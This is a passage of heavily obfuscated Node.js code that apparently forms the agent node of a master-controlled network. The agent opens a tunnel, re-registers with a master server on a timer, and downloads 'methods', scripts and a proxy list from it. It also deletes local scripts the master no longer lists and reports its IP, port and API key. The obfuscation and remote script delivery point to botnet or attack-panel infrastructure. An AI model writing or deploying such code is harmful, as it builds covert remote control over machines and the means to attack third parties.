autoRegisterToMaster(),logActivity(_0x199191(0xde),{'newUrl':currentTunnel[_0x199191(0x24f)]}),console[_0x199191(0xd8)](_0x199191(0x18b));}catch(_0x2ef7a2){logActivity(_0x199191(0x241),{'error':_0x2ef7a2[_0x199191(0x22d)]}),console['error'](_0x199191(0xfd),_0x2ef7a2[_0x199191(0x22d)]);}}async function autoSyncFromMaster(){const _0x12d43b=_0x402d66;if(NODE_TYPE!==_0x12d43b(0x1b9))return;try{const {data:_0x4f9068}=await axios[_0x12d43b(0x149)](MASTER_URL+_0x12d43b(0xca),{'params':{'key':AGENT_KEY},'timeout':0x2710});writeFileJsonSafe(methodsPath,_0x4f9068),logActivity(_0x12d43b(0x1da),{'from':MASTER_URL,'size':Object['keys'](_0x4f9068)[_0x12d43b(0x1cd)]});const _0x2b1b0b=new Set(Object[_0x12d43b(0x21d)](_0x4f9068)['map'](_0x2ea32d=>_0x2ea32d[_0x12d43b(0x1f8)])[_0x12d43b(0x12b)](Boolean));if(!fs[_0x12d43b(0x25e)](uploadDir))fs[_0x12d43b(0x17b)](uploadDir,{'recursive':!![]});const _0x348172=fs[_0x12d43b(0x1ed)](uploadDir)['filter'](_0x1dcb22=>_0x1dcb22[_0x12d43b(0x21f)](_0x12d43b(0x101))||_0x1dcb22[_0x12d43b(0x21f)](_0x12d43b(0x153)));for(const _0x36f6e0 of _0x348172){if(!_0x2b1b0b[_0x12d43b(0x14a)](_0x36f6e0))try{fs[_0x12d43b(0x1a6)](path[_0x12d43b(0x264)](uploadDir,_0x36f6e0)),logActivity(_0x12d43b(0x20c),{'file':_0x36f6e0});}catch(_0x52b8a9){logActivity(_0x12d43b(0x238),{'file':_0x36f6e0,'error':_0x52b8a9[_0x12d43b(0x22d)]});}}for(const _0x5da7a6 of _0x2b1b0b){const _0x38410c=path['join'](uploadDir,_0x5da7a6);if(!fs[_0x12d43b(0x25e)](_0x38410c))try{const _0x5f02ec=MASTER_URL+_0x12d43b(0x1e6)+encodeURIComponent(_0x5da7a6),_0x3a7922=await axios[_0x12d43b(0x149)](_0x5f02ec,{'responseType':'stream','timeout':0x2710}),_0x418b31=fs[_0x12d43b(0x1c2)](_0x38410c);await new Promise((_0x52813e,_0x3fe8f9)=>{const _0x3caa17=_0x12d43b;_0x3a7922[_0x3caa17(0x1e4)][_0x3caa17(0x10e)](_0x418b31),_0x418b31['on'](_0x3caa17(0x1d1),_0x52813e),_0x418b31['on'](_0x3caa17(0xe3),_0x3fe8f9);}),logActivity(_0x12d43b(0x180),{'scriptName':_0x5da7a6});}catch(_0x21f548){logActivity(_0x12d43b(0x171),{'scriptName':_0x5da7a6,'error':_0x21f548[_0x12d43b(0x22d)]});}}try{const _0x24660f=MASTER_URL+'/proxy.txt',_0x1f8b55=path[_0x12d43b(0x264)](__dirname,'proxy.txt'),_0x3d8c6c=await axios['get'](_0x24660f,{'responseType':_0x12d43b(0x21a),'timeout':0x2710}),_0x2a08fe=fs[_0x12d43b(0x1c2)](_0x1f8b55);await new Promise((_0xd1280e,_0x3e7fe7)=>{const _0x3e5df0=_0x12d43b;_0x3d8c6c['data']['pipe'](_0x2a08fe),_0x2a08fe['on'](_0x3e5df0(0x1d1),_0xd1280e),_0x2a08fe['on']('error',_0x3e7fe7);}),logActivity(_0x12d43b(0xc8),{'from':MASTER_URL});}catch(_0x505dfc){logActivity(_0x12d43b(0x19a),{'from':MASTER_URL,'error':_0x505dfc[_0x12d43b(0x22d)]});}}catch(_0x4696e9){logActivity(_0x12d43b(0xc4),{'from':MASTER_URL,'error':_0x4696e9[_0x12d43b(0x22d)]});}}NODE_TYPE===_0x402d66(0x1b9)&&async function initAgent(){currentTunnel=await startLocalTunnel(0xa),await autoRegisterToMaster(),setInterval(autoRegisterToMaster,0x1e*0x3e8),autoSyncFromMaster(),setInterval(autoSyncFromMaster,0x14*0x3e8);let _0x12c737=null;setInterval(()=>{const _0x122aaa=_0x1a82;localTunnelUrl&&localTunnelUrl!==_0x12c737&&(_0x12c737=localTunnelUrl,console['log'](_0x122aaa(0x17d)),autoRegisterToMaster());},0x1388),setInterval(checkTunnelHealth,0x2710);}();app[_0x402d66(0x260)]((_0x15ea6a,_0x5cd45e,_0x1214e0,_0x5eff83)=>{const _0x3ff7cc=_0x402d66;if(_0x15ea6a instanceof multer['MulterError'])switch(_0x15ea6a[_0x3ff7cc(0x23b)]){case'LIMIT_FILE_SIZE':return _0x1214e0[_0x3ff7cc(0x12f)](0x19d)[_0x3ff7cc(0xb6)]({'error':_0x3ff7cc(0xdd)});case'LIMIT_UNEXPECTED_FILE':return _0x1214e0['status'](0x190)['json']({'error':_0x3ff7cc(0x19d)});default:return _0x1214e0['status'](0x190)['json']({'error':'Upload\x20error:\x20'+_0x15ea6a[_0x3ff7cc(0x22d)]});}if(_0x15ea6a instanceof SyntaxError&&_0x15ea6a['status']===0x190&&_0x3ff7cc(0x1d3)in _0x15ea6a)return _0x1214e0[_0x3ff7cc(0x12f)](0x190)[_0x3ff7cc(0xb6)]({'error':_0x3ff7cc(0x141)});if(_0x15ea6a&&_0x15ea6a[_0x3ff7cc(0x22d)])return console[_0x3ff7cc(0xe3)](_0x3ff7cc(0x25a),_0x15ea6a[_0x3ff7cc(0x15a)]||_0x15ea6a),_0x1214e0['status'](0x190)['json']({'error':_0x15ea6a[_0x3ff7cc(0x22d)]});if(_0x15ea6a)return console['error'](_0x3ff7cc(0x1e2),_0x15ea6a[_0x3ff7cc(0x15a)]||_0x15ea6a),_0x1214e0[_0x3ff7cc(0x12f)](0x1f4)[_0x3ff7cc(0xb6)]({'error':'Terjadi\x20kesalahan\x20server.'});_0x5eff83();}),httpServer[_0x402d66(0x1d8)](port,async()=>{const _0x139193=_0x402d66;console[_0x139193(0x1d9)]();let _0x21cb02='localhost';try{_0x21cb02=execSync(_0x139193(0x183))[_0x139193(0xa4)]()[_0x139193(0x157)]();}catch(_0x377f4d){}console['log'](_0x139193(0x24b)+_0x21cb02+':'+port+':'+apiKey),logActivity(_0x139193(0x139),{'ip':_0x21cb02,'port':port,'nodeType':NODE_TYPE});}),process['on'](_0x402d66(0x231),()=>{const _0xd79dce=_0x402d66;logActivity('SIGINT',{'msg':_0xd79dce(0x1ff)}),process[_0xd79dce(0x1c1)]();});